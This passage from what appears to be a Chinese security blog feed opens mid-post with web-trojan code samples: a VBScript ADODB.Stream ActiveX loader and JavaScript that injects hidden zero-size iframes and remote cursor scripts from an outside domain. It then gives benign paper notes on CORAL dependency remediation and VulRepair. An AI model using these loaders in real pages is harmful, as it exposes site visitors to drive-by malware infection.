class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=VBScript&gt;</span><br><span class="line">on error resume next</span><br><span class="line">set server = document.createElement_x(&quot;object&quot;)</span><br><span class="line">server.setAttribute &quot;classid&quot;, &quot;clsid:10072CEC-8CC1-11D1-986E-00A0C955B42E&quot;</span><br><span class="line">set File = server.createobject(Adodb.Stream,&quot;&quot;)</span><br><span class="line">if Not Err.Number = 0 then</span><br><span class="line">err.clear</span><br><span class="line">document.write (&quot;&lt;iframe src=http://upx.com.cn width=100% height=100% scrolling=no frameborder=0&gt;&quot;)</span><br><span class="line">else</span><br><span class="line">document.write (&quot;&lt;iframe src=http://upx.com.cn width=100% height=100% scrolling=no frameborder=0&gt;&quot;)</span><br><span class="line">end if</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="十三-智能读取js的代码demo"><a href="#十三-智能读取js的代码demo" class="headerlink" title="十三:智能读取js的代码demo"></a>十三:智能读取js的代码demo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">//读娶src的对象</span><br><span class="line">var v = document.getElementByIdx_x(&quot;advjs&quot;);</span><br><span class="line">//读娶src的参数</span><br><span class="line">var u_num = getUrlParameterAdv(&quot;showmatrix_num&quot;,v.getAttribute(&#x27;src&#x27;));</span><br><span class="line"></span><br><span class="line">document.write(&quot;&lt;iframe src=\&quot;http://www.upx.com.cn/1/&quot;+u_num+&quot;.htm\&quot; width=\&quot;0\&quot; height=\&quot;0\&quot; frameborder=\&quot;0\&quot;&gt;&lt;/iframe&gt;&quot;);</span><br><span class="line">document.writeln(&quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-\/\/W3C\/\/DTD HTML 4.0 Transitional\/\/EN\&quot;&gt;&quot;);</span><br><span class="line">document.writeln(&quot;&lt;HTML&gt;&lt;HEAD&gt;&quot;);</span><br><span class="line">document.writeln(&quot;&lt;META http-equiv=Content-Type content=\&quot;text\/html; charset=big5\&quot;&gt;&quot;);</span><br><span class="line">document.writeln(&quot;&lt;META content=\&quot;MSHTML 6.00.2900.3059\&quot; name=GENERATOR&gt;&lt;\/HEAD&gt;&quot;);</span><br><span class="line">document.writeln(&quot;&lt;BODY&gt; &quot;);</span><br><span class="line">document.writeln(&quot;&lt;DIV style=\&quot;CURSOR: url(\&#x27;http:\/\/www.upx.com.cn\/demo.js\&#x27;)\&quot;&gt;&quot;);</span><br><span class="line">document.writeln(&quot;&lt;DIV &quot;);</span><br><span class="line">document.writeln(&quot;style=\&quot;CURSOR: url(\&#x27;http:\/\/www.upx.com.cn\/demo.js\&#x27;)\&quot;&gt;&lt;\/DIV&gt;&lt;\/DIV&gt;&lt;\/BODY&gt;&lt;\/HTML&gt;&quot;)</span><br><span class="line"></span><br><span class="line">//分析src的参数函数</span><br><span class="line">function getUrlParameterAdv(asName,lsURL)&#123;</span><br><span class="line"></span><br><span class="line">loU = lsURL.split(&quot;?&quot;);</span><br><span class="line">if (loU.length&gt;1)&#123;</span><br><span class="line"></span><br><span class="line">var loallPm = loU[1].split(&quot;&amp;&quot;);</span><br><span class="line"></span><br><span class="line">for (var i=0; i&lt;loallPm.length; i++)&#123;</span><br><span class="line">var loPm = loallPm.split(&quot;=&quot;);</span><br><span class="line">if (loPm[0]==asName)&#123;</span><br><span class="line">if (loPm.length&gt;1)&#123;</span><br><span class="line">return loPm[1];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return null;</span><br></pre></td></tr></table></figure></SCRIPT>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Compatible Remediation on Vulnerabilities from Third-Party Libraries for Java Projects</title>
      <link href="/2023/05/02/CORAL/"/>
      <url>/2023/05/02/CORAL/</url>
      
        <content type="html"><![CDATA[<p>下面分享一篇我发表在安全学术圈上的论文笔记。<a href="https://mp.weixin.qq.com/s/VTC6kUVNItfwxq2RIQmc5g">原文</a></p><blockquote><p><em>原文标题：Compatible Remediation on Vulnerabilities from Third-Party Libraries for Java Projects</em><br><em>原文作者：Lyuye Zhang, Chengwei Liu, Zhengzi Xu, Sen Chen, Lingling Fan, Lida Zhao, Jiahui Wu, Yang Liu</em><br><em>原文链接：<a href="https://arxiv.org/abs/2301.08434">https://arxiv.org/abs/2301.08434</a></em><br><em>发表期刊：In Proceedings of the 45th International Conference on Software Engineering(ICSE)</em><br><em>笔记作者：senu11@学术安全圈</em><br><em>笔记小编：黄诚@学术安全圈</em></p></blockquote><p>本篇从用户的角度出发，在保证用户最好的体验下(即修复漏洞的版本不会造成业务崩溃)进行漏洞修复。</p><h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h1><p>SCA（software composition analysis）工具修复的漏洞质量差异很大，无效的修复可能会导致副作用，例如编译失败，从而阻碍用户接受。由于现有的 SCA 工具无法正确处理用户对修复项目兼容性的担忧，作者为 Maven 项目提出了一个在不破坏项目的情况下修复第三方库漏洞的兼容修复工具 CORAL。CORAL 修复了 87.56% 的漏洞，优于其他工具（最好的 75.32%），编译成功率达到 98.67%，单元测试成功率(unit test rate)达到 92.96%。此外流行的Maven项目中78.45%的漏洞可以在不破坏编译( breaking the compilation,)的情况下修复，其余的漏洞（21.55%）要么通过升级破坏编译修复，要么升级无法修复。</p><h1 id="2-背景（赶时间的可以不看）"><a href="#2-背景（赶时间的可以不看）" class="headerlink" title="2.背景（赶时间的可以不看）"></a>2.背景（赶时间的可以不看）</h1><h2 id="2-1-motivation"><a href="#2-1-motivation" class="headerlink" title="2.1.motivation"></a>2.1.motivation</h2><p><a href="https://github.com/dependabo">Dependabot</a> 是 GitHub 上依赖性安全管理扩展，<a href="https://github.com/apache/commons-lang">commons-lang</a>采用了 Dependabot 来管理依赖关系。然而<a href="https://github.com/apache/commons-lang/pull/826">一次修复在升级后造成了构建失败</a>。Dependabot 通过计算来自其他存储库的测试通过率作为置信度分数来实现兼容性分数，然而这个例子中的兼容性分数是未知的，由于没有基于代码的兼容性计算，依靠人群的知识的兼容性分数不能保证成功编译。</p><p>CORAL 依靠基于静态代码的兼容性检查器与 DG(dependency graph) 的全局视角保持一致，以确保调整后的依赖关系不会破坏项目。</p><h2 id="2-2-现有工具处理兼容性问题缺点"><a href="#2-2-现有工具处理兼容性问题缺点" class="headerlink" title="2.2.现有工具处理兼容性问题缺点"></a>2.2.现有工具处理兼容性问题缺点</h2><p><img src="image-20240520151745055.png" alt="image-20240520151745055"></p><p><strong>Dependabot</strong> 创建 PR（Pull Requests） 将易受攻击的依赖项升级到安全版本，不为整个 DG 提供整体修复建议。对于兼容性，Dependabot 会计算从其他存储库升级的成功测试率作为置信度分数。然而，这个分数可能不可靠，因为它通常不可用，兼容性最终取决于代码库的上下文。</p><p><strong>Steady</strong> 是一个开源学术 SCA 工具，带有一个开源漏洞数据库，其调整直接依赖和传递依赖的版本以细粒度降低漏洞风险。它利用漏洞的可达性分析来过滤掉低风险的无法访问的CVE，可达性包括静态和动态分析，它只在开始时构造一次调用图。Steady 优先考虑非易受攻击的版本，然后根据兼容性概率 p 去确定最佳候选者。为了推导p，它将可达的构造（类、方法等）定义为 touch points，并计算升级版本中当前 touch points 的百分比作为p。由于其不确定性，概率可能不可靠。</p><p>以下两个商用工具记为 Com A 和 Com B（<strong>这是怕绿尸函吗</strong>）</p><p><img src="image-20240520152145413.png" alt="image-20240520152145413"></p><p><strong>Com A</strong> 仅调整DG的直接依赖项以修复漏洞。基本策略是将有漏洞的库升级到最接近的无漏洞版本，因为越接近的版本通常越可能兼容。可达性由 <a href="https://github.com/wala/WALA">WALA</a> 以静态方式实现，优先考虑关键的可达漏洞,但是没有考虑修复的兼容性。</p><p><strong>Com B</strong> 对直接依赖项进行修复。com B 考虑了与直接依赖相关的传递依赖的所有漏洞；遍历所有直接依赖项，对于每个版本，Com B 尝试候选版本并解决后续依赖关系以衡量更新后的整体漏洞；然后为这个直接依赖选择整体漏洞最少的版本。该策略考虑了升级后的直接依赖对上游树的连锁反应，然而由于直接依赖通常不是独立的，而是通过传递依赖关系相互连接的，因此每个直接依赖的各自优化并不一定会导致全局优化。</p><h2 id="2-3-小总结"><a href="#2-3-小总结" class="headerlink" title="2.3.小总结"></a>2.3.小总结</h2><p>作者对 <a href="https://sites.google.com/view/icse23remediation">GitHub 上被拒绝的修复建议进行研究</a>，用户最关心的问题是不兼容，占 51.31%。对于修复漏洞中出现的兼容性为主要问题的一系列的现状，有两个原因无法被现有的修复工具妥善处理：</p><p>（1）现有的修复工具只对单个第三方库进行局部优化，而不是对整个依赖图（DG）进行全局优化，可能会遗漏不兼容的关系，也无法在兼容性和安全性之间做出选择(fail to handle the trade-off between compatibility and security)。 </p><p>(2)现有的修复工具基于原始 DG 提出修复建议，忽略了建议给其和底层调用图带来的结构变化。因此，过时的 DG 可能导致不兼容、缺乏对新漏洞的修复、浪费对未使用的依赖关系的补救措施。</p><p>要解决现有的问题，有三个较大的挑战：</p><p><strong>c1</strong>：第三方库的绝对最佳解决方案并不总是可用，必须在决策过程中处理安全性和兼容性之间的问题。 </p><p><strong>c2</strong>：全局优化的复杂度随着依赖的数量呈指数增长，因为要遍历所有库的版本组合。 </p><p><strong>c3</strong>：对一个三方库的建议会直接或间接地改变 DG 的结构、调用图和 DG 的兼容性，导致其余三方库的最佳解决方案也可能会发生变化，这些影响通过依赖关系从更改后的库传播到整个 DG，在本文中称为ripple effects。如果 DG 没有得到相应更新，ripple effects可能会导致次优解决方案。</p><h1 id="3-数据集"><a href="#3-数据集" class="headerlink" title="3.数据集"></a>3.数据集</h1><p>Data set：<a href="https://sites.google.com/view/icse23remediation">https://sites.google.com/view/icse23remediation</a></p><p>为了构建开发中的 Maven 项目数据集，收集了 2022 年 5 月 21 日在 GitHub 上由 Maven 管理的 301 个star最多的项目。</p><p>首先从 GitHub 中选择了star最多的 Java 项目，并排除了非 Maven 项目；接下来，手动修改了每个项目的 POM 文件，以应用来自这些工具的修复建议。用 1K+ star 筛选了这些项目，得到了301个入选项目。数据集的demographics如图 4 所示，具有以下特点：（1）代码库大小不小（平均 22.19 kloc）； (2) 依赖图的大小范围较大（最大 327，平均 32.0）； (3) 项目受到足够数量的 CVE 影响（平均 27.6）； (4)项目受欢迎。</p><p><img src="image-20240520152153926.png" alt="image-20240520152153926"></p><p>为了试验准确的漏洞映射，使用管道定期从 NVD 抓取 CVE feeds，并通过关键字匹配对 CVE 的语言进行预分类。由于 CVE 描述是自由文本，因此手动对来自参考链接和相关 CPE 的映射进行分类。到2022 年 5 月 21 日为止，收集了 1759 个与 Maven 库关联的 CVE 的映射。</p><p>由于评估需要进行可达性分析，需要与 CVE 关联的易受攻击的方法和类，因此首先从 301 个项目中用作依赖项的 2326 个唯一库中识别出 750 个 CVE（占所有 Maven CVE 的 42.64%）；然后从 NVD 链接上可用的补丁中成功识别并手动收集了 300 个 CVE 的易受攻击的类和方法。</p><h1 id="4-框架"><a href="#4-框架" class="headerlink" title="4.框架"></a>4.框架</h1><p><img src="image-20240520152201839.png" alt="image-20240520152201839"></p><p>上图是CORAL的框架，包含四个步骤。</p><p>step1：从项目对象模型(pom)文件、Maven的版本控制文件和项目的类文件生成DG和调用图(call graph,CG)；</p><p>step2： 将 DG 划分为子图；</p><p>step3：在保证兼容性的情况下，根据预先计算的漏洞映射(vulnerability mappings)优化漏洞风险子图；</p><p>step4：如果遇到死胡同，则试探性地回溯(backtracking)到父顶点,然后返回DG中所有TPL(第三方库)版本调整的最终修复建议。</p><h2 id="4-1-构建-DG-和-CG"><a href="#4-1-构建-DG-和-CG" class="headerlink" title="4.1.构建 DG 和 CG"></a>4.1.构建 DG 和 CG</h2><h3 id="4-1-1-构建-DG"><a href="#4-1-1-构建-DG" class="headerlink" title="4.1.1.构建 DG"></a>4.1.1.构建 DG</h3><p>通过pom文件和类文件，CORAL通过Maven命令提取依赖树，并通过从预先计算的依赖数据库补全缺失的依赖关系来修复DG(<strong>读者有个疑问，怎样计算的依赖？</strong>)。根据<a href="https://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html#Dependency_Scope">Maven 文档</a>，由于项目的正常使用不涉及具有test scope 的依赖项，CORAL 从 DG 中排除了具有 test scope 的依赖项（<strong>读者有个疑问，怎样排除的？</strong>）。</p><p>具体来说，DG 表示为 DG &#x3D; Graph(V, E)，</p><p>其中 V &#x3D; {${e_i}^x$}，i ∈ {0,,,N-1}，x ∈ {0,,,L}； </p><p>E &#x3D; {$e_i$ → $e_J$}，i,j ∈ {0,,,N-1}，→表示调用边的方向，x指定相对于DG的堆栈级别（x specifies the stack level w.r.t the DG）。</p><p>（<strong>读者有个疑问，L可以结合4.2.节理解为层级，那N代表什么？</strong>）</p><h3 id="4-1-2-构建-CG"><a href="#4-1-2-构建-CG" class="headerlink" title="4.1.2.构建 CG"></a>4.1.2.构建 CG</h3><p>CG是由<a href="https://soot-build.cs.uni-paderborn.de/public/origin/develop/soot/soot-develop/options/soot_options.htm#phase_5_2">Spark算法</a>根据项目的类文件在<a href="https://dl.acm.org/doi/abs/10.1145/1925805.1925818">Soot</a>基础上静态构建的。</p><p>main()被认为是入口点，作为调用图的开始；若没有main()，overestimate（<strong>这里会不会是作者写错了，应该是estimate？</strong>） 执行项目中实现的所有方法的可能性，因此用户项目中的所有方法都被视为入口点。</p><p>由于处理ripple effects需要动态更新的CG来实现实时可达性分析，CG中的调用边被模块化地收集（<strong>读者有个疑问，用什么进行模块化收集？</strong>）。即调用边不是从Uber jar（具有所有依赖关系的根项目）中提取的，而是从每个依赖的jar中分别按顺序提取的，然后整合到一个源自根项目的图中。</p><p>对于每个依赖，来自父库的调用者作为子库的入口点。</p><p>修复之后，如果子库被建议为其他版本，其中的调用者可以被相应地替换，以灵活地生成实时CG。</p><h2 id="4-2-构建-DG-子图"><a href="#4-2-构建-DG-子图" class="headerlink" title="4.2.构建 DG 子图"></a>4.2.构建 DG 子图</h2><p><img src="image-20240520152210517.png" alt="image-20240520152210517"></p><p>由于对整个 DG 进行优化的复杂性很高，CORAL 将 DG 划分为子图以减小整体解空间的大小，分为垂直分区和水平分区。</p><h3 id="4-2-1-垂直分区"><a href="#4-2-1-垂直分区" class="headerlink" title="4.2.1.垂直分区"></a>4.2.1.垂直分区</h3><p>如图 2 (a) 所示，垂直分区迭代地将 DG 分成多个分区，这些分区除了来自根项目v1的直接关系外，彼此之间没有依赖关系，直到所有未连接的分区被分割。由于直接依赖不相互依赖( Since the direct dependencies do not depend on each other,读者这句话没有看懂，，，emo了)，所以对多个分区的优化可以独立地、同时地进行。例如图 2（a）中的分区 1 和分区 2 不相互依赖，可以对它们进行分区以提高性能。</p><h3 id="4-2-2-水平分区"><a href="#4-2-2-水平分区" class="headerlink" title="4.2.2.水平分区"></a>4.2.2.水平分区</h3><p>垂直分区并不能处理类似图 2 (a) 左侧的大分区的情况，水平划分可以进一步减少解空间，子图按层级(level)划分以保留语义。根据 <a href="https://ieeexplore.ieee.org/abstract/document/5463280/">Do stack traces help developers fix bugs</a>，函数的语义沿着调用链衰减，即更接近根的依赖比远离根的依赖更多。依赖性由 level 标记，表示从根开始的最小跳数。</p><p>为了更好地保留依赖关系的语义以防止潜在的不兼容性，CORAL 将 DG 拆分并将level为 l 和 l−1 的顶点分组为子图，如图 2 (b) 所示。</p><p>然后，由于更紧密的依赖关系保留了更多的语义，CORAL 以自上而下的方式从根用户项目开始优化，低级依赖应尽可能在兼容性约束方面兼顾上级依赖。因此，CORAL 试图一次优化相邻两层的依赖关系，然后用新更新的CG 将分区的滑动窗口下移到下一层。</p><p>通过水平划分，复杂度可以降低为 O(n) &#x3D; $\sum_{Phori&#x3D;1}^{phori}$ $\sum_{Pvert&#x3D;1}^{pvert}$ $\prod_{n&#x3D;1}^{N_P}$。(<strong>作者为什么写文章的时候不考虑一下菜逼的感受，都不带解释一下的嘛</strong>)</p><p>坏处是，对于跨多个级别的依赖边，可能会忽略具有较低漏洞风险的潜在更好解决方案。为了弥补损失，第4.4 节引入了回溯机制以避免出现次优情况。</p><h2 id="4-3-优化-DG-子图-数学不好的别看"><a href="#4-3-优化-DG-子图-数学不好的别看" class="headerlink" title="4.3.优化 DG 子图(数学不好的别看)"></a>4.3.优化 DG 子图(数学不好的别看)</h2><p><img src="image-20240520152217414.png" alt="image-20240520152217414"></p><p>本节是基于<a href="https://github.com/Z3Prover/z3">Z3 SMT </a>进行的。</p><p>CORAL对每个子图进行优化，在版本变化兼容的条件下，使漏洞风险最小。漏洞的消除遵循方程（1）中的目标函数。</p><p><img src="image-20240520152226379.png" alt="image-20240520152226379"></p><p>其中 M 是库的数量；Vul 是顶点 m 的漏洞数量；$f_{cvss}$ 是 CVSS 的权重；$θ_v$ 是漏洞 v 的可达性系数，(对于可达漏洞，有可能被攻击者利用，$θ_v$ 较大);将具有不确定漏洞类或方法的漏洞归类为未知漏洞，其严重程度介于可到达和不可到达漏洞之间;由于不同的漏洞会导致不同的风险，在计算时使用 CVSS 来优先考虑风险较高的漏洞。</p><p>基本的漏洞消除策略是找到具有最少的可达和未知漏洞的版本。然后，如果有多个版本满足这些条件和其他约束，则优先选择没有不可达漏洞的版本。</p><p>兼容性约束应该是严格的,但并非所有类型的不兼容性都可以准确检测到。一般来说，CORAL 主要解决语义中断、句法中断和依赖冲突，除了语义破坏，其余的都可以静态和高效地检测。因此，将其余的检测作为约束集成到优化中：</p><p><img src="image-20240520152233226.png" alt="image-20240520152233226"></p><p>synb为语法破坏，是根据可达性分析和API兼容性检查器计算出来的。对于一个库的每个版本对，通过三个最广泛使用的API兼容性检查器 <a href="https://lvc.github.io/japi-compliance-checker/">japi-compliancechecker</a>, <a href="https://revapi.org/revapi-site/main/index.html">revapi</a>,  &#x3D;<a href="https://siom79.github.io/japicmp/">japicmp</a>根据这对jar文件计算可能导致编译失败的修改过的API。然后，基于可达性分析，从 CG 中获得该库的被调用的API，如果有任何有问题的 API 被调用，编译就会失败，CORAL 标记这个候选版本为破坏性的，弃之。</p><p><img src="image-20240520152238695.png" alt="image-20240520152238695"></p><p>DC 问题(Dependency conflict)是根据<a href="https://maven.apache.org/pom.html#Version_Order_Specificationl"> Maven 版本规则</a> 计算的。版本范围定义了依赖项的允许版本。如果依赖需要的两个版本范围不重叠，Maven会在编译前的版本解析时报告DC。 CORAL 实现了类似的逻辑，仅选择依赖项定义的范围交集内的版本。超过99%的依赖版本规范不是由范围确定的，而是单一的推荐版本代替，即不考虑兼容性所有版本都可用，CORAL 像Maven一样将所有版本都作为DC检测的候选版本。</p><p><a href="https://dl.acm.org/doi/abs/10.1145/3377811.3380436">据此</a>，语义中断通常是由覆盖范围有限的单元测试表示的，很难用静态有效地检测；此外，<a href="https://dl.acm.org/doi/abs/10.1145/3092703.3092721">其也是单元测试失败的主要原因</a>，这是用户拒绝补救建议的主要原因之一。CORAL 依靠辅助信息来推断潜在的语义破坏，并通过遵循 SemVer 和 Maven 版本控制指南将其可能性降到最低。根据 SemVer ，重大(major)升级可以打破原状，CORAL 尽可能避免使用重大升级&#x2F;降级，除非其不易受攻击且满足其他兼容性标准。因此，除了主要目标之外，还添加了一个次要目标 $f_{major}$，即具有重要升级&#x2F;降级的依赖项的数量：</p><p><img src="image-20240520152253065.png" alt="image-20240520152253065"></p><p> SemVer 规定 Minor 不应包含不兼容更改，<a href="https://ieeexplore.ieee.org/abstract/document/7884616/">但</a> 发现 Minor 升级不如 Patch 升级兼容，其会引入更多破坏性更改。因此，如果所有其他条件都满足，CORAL 倾向于Patch升级而不是Minor升级。另一个次要目标函数 $f_{minor}$ 是为了实现这个目的而创建的:</p><p><img src="image-20240520152259819.png" alt="image-20240520152259819"></p><p>除了 SemVer，<a href="https://maven.apache.org/pom.html#Version_Order_Specificationl">Maven 版本控制规则</a> 也有助于识别潜在的破坏版本。首先，pre-release 版本，也称为开发版本，如 alpha、beta、SNAPSHOT 版本，不稳定且容易发生重大更改，其选择优先级低于 Major 升级。其次，较大的版本跨度通常更有可能导致不兼容的更改。 CORAL 试图尽可能地减少从原始版本到新版本的版本跨度。针对这两个目标，给出fdev和fspan的函数：</p><p><img src="image-20240520152306138.png" alt="image-20240520152306138"><br>其中 dist(x, y) 是版本序列中 x,y 之间的距离。</p><p>使用SMT求解后，子图中的每个顶点都分配一个选定的版本，CG中升级的库将相应更新，但所选版本可能会被下一次优化推翻，因此所有可选择的候选版本都被保存并提供给下一个优化。</p><p><img src="image-20240520152407984.png" alt="image-20240520152407984"></p><p>例如在图 3 (a) 中，Lib 3 最初有 7 个候选者，由于不兼容性和漏洞被过滤为 3 个；在下一次迭代 (b) 中，Lib 3 由于不兼容而将其候选者进一步过滤为 2；然后，由于与原始版本的版本跨度较小，因此选择了 v5，但是在第三次迭代（c）中，v5 被推翻，因为它与较低层级的父库 Lib 13 不兼容；由于无论层级如何，编译和Maven解析都会失败，因此选择的版本必须遵循等式（3）和（4）中的约束，因此放弃v5，选择具有兼容变化的v6。</p><h2 id="4-4-回溯"><a href="#4-4-回溯" class="headerlink" title="4.4.回溯"></a>4.4.回溯</h2><p>尽管 DG 的顺序分区降低了复杂性，但它们可能导致次优解决方案和死胡同。为了缓解这些问题，CORAL 中实现了两种类型的回溯机制，即硬回溯和软回溯。</p><h3 id="4-4-1-硬回溯"><a href="#4-4-1-硬回溯" class="headerlink" title="4.4.1.硬回溯"></a>4.4.1.硬回溯</h3><p>在决定库的最佳版本期间时，其中所有版本都可能破坏项目而违反约束，实施硬回溯以避免死胡同，回溯目标是当前库的父库。由于回溯需要重新访问相关的顶点，因此优先考虑最底层的父库，以减少重新访问的工作量；然后，如果较低的父级再次触发回溯，则尝试较高的。在一次回溯期间，目标父母的选定版本暂时标记为不兼容，并尝试其他版本。</p><h3 id="4-4-2-软回溯"><a href="#4-4-2-软回溯" class="headerlink" title="4.4.2.软回溯"></a>4.4.2.软回溯</h3><p>当SMT求解器选择的版本不是版本列表中漏洞风险最低的版本时触发软回溯，用于避免次优解决方案，比如无漏洞版本。与硬回溯一样，软回溯优先考虑较低级别的父库，不同的是软回溯不会将父版本的当前版本标记为不兼容，而是unpreferrable，即如果回溯后其他版本被证明不如unpreferrable最优，则仍会选择unpreferrable版本。因此，即使版本满足约束条件，它们也可能被软回溯忽略。</p><p>在软回溯过程中，CORAL 保存回溯库和目标父库之间的整体漏洞，以供将来比较；回溯后，CORAL 将当前运行的漏洞与之前保存的漏洞进行比较，并采用漏洞最少的运行版本，将其相应地应用到回溯库中。</p><p>为避免无限循环，在一次软回溯运行期间不会再次触发软回溯。此外，如果在软回溯期间触发硬回溯，则当前运行版本将被丢弃，并尝试其他版本。</p><h2 id="4-5-算法总结"><a href="#4-5-算法总结" class="headerlink" title="4.5.算法总结"></a>4.5.算法总结</h2><p>总之，CORAL 旨在克服全局优化的高度复杂性和ripple effects的挑战。<br><img src="image-20240520152423732.png" alt="image-20240520152423732"></p>]]></content>
      
      
      <categories>
          
          <category> 论文阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞修复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulRepair: A T5-Based Automated Software Vulnerability Repair</title>
      <link href="/2023/04/28/VulRepair/"/>
      <url>/2023/04/28/VulRepair/</url>
      
        <content type="html"><![CDATA[<p>下面分享一篇我发表在安全学术圈上的论文笔记。<a href="https://mp.weixin.qq.com/s/K7P5YA6q6nPhEIky4q_oWg">原文</a></p><blockquote><p><em>原文标题：VulRepair: A T5-Based Automated Software Vulnerability Repair</em><br><em>原文作者：Michael Fu, Chakkrit Tantithamthavorn, Trung Le, Van Nguyen, Dinh Phung</em><br><em>原文链接：<a href="https://dl.acm.org/doi/10.1145/3540250.3549098">https://dl.acm.org/doi/10.1145/3540250.3549098</a></em><br><em>发表期刊：ESEC&#x2F;FSE 22: 30th ACM Joint European Software Engineering Conference and Symposium on the Foundations of Software Engineering</em><br><em>笔记作者：senu11@安全学术圈</em><br><em>笔记小编：黄诚@安全学术圈</em></p></blockquote><h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1.背景"></a>1.背景</h1><p>作者关注到 VRepair，并发现有以下三个缺点：</p><p>1.bug修复数据集太小，可能导致向量表示不是最优的。</p><p>2.使用词级的分词器和复制机制处理OOV不太恰当，因其无法将从未出现在漏洞函数的token重用到漏洞修复中，限制了在补丁代码中生成新的token的能力</p><p>3.使用的Transformer模型利用绝对位置进行编码，限制了其自注意力机制学习输入序列中的token的相对位置信息的能力，可能会使VRepair注意到不正确的token，例如括号不是变量名。</p><p>为了解决上述问题，作者提出了一个新方法 VulRepair ，使用大型代码库（<a href="https://arxiv.org/abs/1909.09436">CodeSearchNet</a> 和 <a href="https://arxiv.org/abs/2109.00859">Wang 等人提取的 C&#x2F;C# 语料库</a>，由八种不同的编程语言Ruby、JavaScript、Go、Python、Java、PHP、C、C#上共835万个函数组成）预训练的CodeT5组件，可以生成更好的向量表示；使用BPE分词器(也由上述大型代码库进行预训练)解决 OOV 问题；使用在自注意力机制中考虑相对位置的信息的T5架构。相比较于 VRepair，实现了 44% 的准确度。</p><h1 id="2-数据集"><a href="#2-数据集" class="headerlink" title="2.数据集"></a>2.数据集</h1><p>作者使用和VRepair一样的数据集<a href="https://dl.acm.org/doi/abs/10.1145/3379597.3387501">Big-Vul</a>、<a href="https://dl.acm.org/doi/abs/10.1145/3475960.3475985">CVEfixes</a>来评估 VulRepair；且划分一致，即将实验数据集分为 70% 的训练数据、10% 的验证数据和 20% 的测试数据</p><p>为了保证实验的公平性，作者将数据集进行与VRepair一样的处理，即添加”&lt;StartLoc&gt;”、”&lt;EndLoc&gt;”、”&lt;ModStart&gt;”、”&lt;ModEnd&gt;”一样的标签，将这些标签添加到分词器中的主要目的是确保此类特殊标签不会被视为常规token，并且不会被分词器拆分；同时，这种特殊的标签有助于模型关注易受攻击的代码片段和漏洞修复区域</p><h1 id="3-VulRepair"><a href="#3-VulRepair" class="headerlink" title="3.VulRepair"></a>3.VulRepair</h1><p>作者提出的VulRepair框架如下所示，分为三个步骤，粗略的介绍如下。</p><p><img src="image-20240520144744674.png" alt="image-20240520144744674"></p><p><strong>step1</strong>，使用<a href="https://arxiv.org/abs/2109.00859">基于 CodeT5 预训练语言模型</a> 的 <a href="https://arxiv.org/abs/1508.07909">BPE</a>(Byte Pair Encoding) 对 subword 进行分词，以生成每个函数的 subword token列表。</p><p><strong>step2</strong>，构建了一个基于 <a href="https://dl.acm.org/doi/abs/10.5555/3455716.3455856">T5 架构</a>的 VulRepair 模型。对于每个已经进行 subword 分词的函数处理有四步：</p><p>step 2a，VulRepair 执行词嵌入以生成每个token的嵌入向量并将其组合成矩阵；</p><p>step2b ，step 2a 合成的矩阵被送入 T5 编码器堆栈；</p><p>step2c ，step2b 中的最后一个 T5 编码器的输出被送入每个 T5 解码器；</p><p>step2d ，T5 解码器堆栈的输出被馈送到具有 softmax 激活的线性层以生成词汇表的概率分布。</p><p><strong>step3</strong> ，在词汇的概率分布之上利用 Beam search来生成最终候选词作为预测。</p><h2 id="3-1-代码表示"><a href="#3-1-代码表示" class="headerlink" title="3.1.代码表示"></a>3.1.代码表示</h2><p>对于每个具有漏洞的函数进行代码表示处理有两个步骤。</p><h3 id="3-1-1-BPE-Subword-Tokenization"><a href="#3-1-1-BPE-Subword-Tokenization" class="headerlink" title="3.1.1.BPE Subword Tokenization"></a>3.1.1.BPE Subword Tokenization</h3><p>上文提到的 <strong>step 1</strong> 包含两个步骤。</p><p><strong>step 1a</strong>. 生成合并操作(generating merge operations)以确定应如何拆分单词；</p><p><strong>step 1b</strong>. 根据 Subword 词汇表执行合并操作。</p><p>具体来说，BPE 会将所有token拆分为字符序列，以及确定应该合并为新符号的最常见符号对（例如两个连续字符对）。 BPE 是一种将稀有标记拆分为有意义的子词并同时保留常见标记（即不会将常见单词拆分为更小的子词）的算法。例如，函数名称 IsValidSize 将被拆分为子词列表 [“IsValid”, “Size”]，稀有词 IsValidSize 被拆分为两个常见词，IsValid 和 Size。</p><p>BPE subword tokenization 有助于在对各种token进行分词时减少词汇表的大小，其将稀有token拆分为多个subword，而不是直接将完整token添加到词汇表中，且<a href="https://dl.acm.org/doi/abs/10.1145/3510003.3510067">BPE确保在漏洞修复中能够生成从未出现在漏洞函数中的新token</a>。</p><p>为了更好的进行代码生成任务，作者添加了“&lt;s&gt;”和“&lt;&#x2F;s&gt;”标记来表示序列的开头 (BOS) 和序列的结尾 (EOS)；“&lt;pad&gt;”标记用于将输入序列填充到相同的长度；在词汇表中添加了四个特殊标记（“&lt;StartLoc&gt;”、“&lt;EndLoc&gt;”、“&lt;ModStart&gt;”、“&lt;ModEnd&gt;”）作为额外的词汇 